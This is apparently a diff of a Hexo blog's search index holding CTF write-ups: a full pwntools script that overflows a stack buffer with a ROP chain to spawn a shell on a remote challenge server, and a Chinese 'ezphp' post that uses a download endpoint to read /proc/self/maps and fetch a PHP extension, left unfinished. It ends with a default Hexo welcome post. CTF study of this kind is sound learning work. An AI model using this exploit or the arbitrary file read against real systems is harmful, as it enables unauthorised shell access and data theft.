+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./attachment&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.27.so&#x27;, &#x27;LD_LIBRARY_PATH&#x27;: &#x27;.&#x27;&#125;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34792</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_info</span>(<span class="params">name, addr</span>):</span><br><span class="line">    output_log = <span class="string">&#x27;&#123;&#125; =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, <span class="built_in">hex</span>(addr))</span><br><span class="line">    all_logs.append(output_log)</span><br><span class="line">    success(output_log)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">weapon</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;..!?\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bless</span>(<span class="params">count, addr</span>):</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(count).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(addr).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">content1, content2</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    sh.send(content1)</span><br><span class="line">    </span><br><span class="line">    sh.send(content2)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x04007fe</span></span><br><span class="line">pop_rdi = <span class="number">0x4013f4</span></span><br><span class="line">pop_rsi = <span class="number">0x4013f6</span></span><br><span class="line">pop_rdx = <span class="number">0x4013f8</span></span><br><span class="line">pop_rsp = <span class="number">0x4013fa</span></span><br><span class="line">bin_sh = <span class="number">0x4019D7</span></span><br><span class="line">syscall = <span class="number">0x602058</span></span><br><span class="line"></span><br><span class="line">weapon(<span class="number">0x25a8</span>)</span><br><span class="line">bless(<span class="number">5</span>, syscall)</span><br><span class="line"></span><br><span class="line">payload1 = p64(ret)*<span class="number">22</span></span><br><span class="line">rop_chain = p64(pop_rdi) + p64(bin_sh)</span><br><span class="line">rop_chain += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(pop_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">rop_chain += p64(pop_rsp) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload1 = payload1 + rop_chain</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">59</span></span><br><span class="line">challenge(payload1, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.send(&#x27;exec 1&gt;&amp; 0&#x27;)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>stack-overflow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF题解：ezphp</title>
+    <url>/2026/02/01/2026-02-01-ezphp/</url>
+    <content><![CDATA[<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>打开题目界面，需要输入用户名和密码，我们F12查看，可以发现用户名和密码是硬编码的，直接输入即可登录</p>
+<p><img src="/images/VNCTF2026/02-01-ezphp/passwd.png" alt="image-20260202140316527"></p>
+<p>登录后，发现需要想办法获取到拓展文件的路径然后下载它，尝试在文件下载接口输入 <code>/proc/self/maps</code>（<em>输出当前进程的内存映射信息，在ret2vdso调试部分详细解释</em>），就可以下载一个文件，打开后即可找到vuln.so路径</p>
+<p><img src="/images/VNCTF2026/02-01-ezphp/pass.png" alt="image-20260202141950226"></p>
+<p>接下来直接访问<a href="http://114.66.24.228:33951/download.php?path=/usr/local/lib/php/extensions/no-debug-non-zts-20240924/vuln.so%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD">http://114.66.24.228:33951/download.php?path=/usr/local/lib/php/extensions/no-debug-non-zts-20240924/vuln.so就可以下载</a> vuln.so</p>
+<p>查了一下这个.so文件好像是什么php扩展，反编译好多代码，有关堆的使用，不理解在干什么。没看懂，先放着了。</p>
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ai</tag>
+        <tag>fuzzing</tag>
+      </tags>
   </entry>
   <entry>
     <title>学习笔记：堆溢出的Off-By-One</title>
@@ -1158,5 +1140,23 @@
         <tag>ctf</tag>
         <tag>heap-overflow</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2025/12/04/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
   </entry>
 </search>
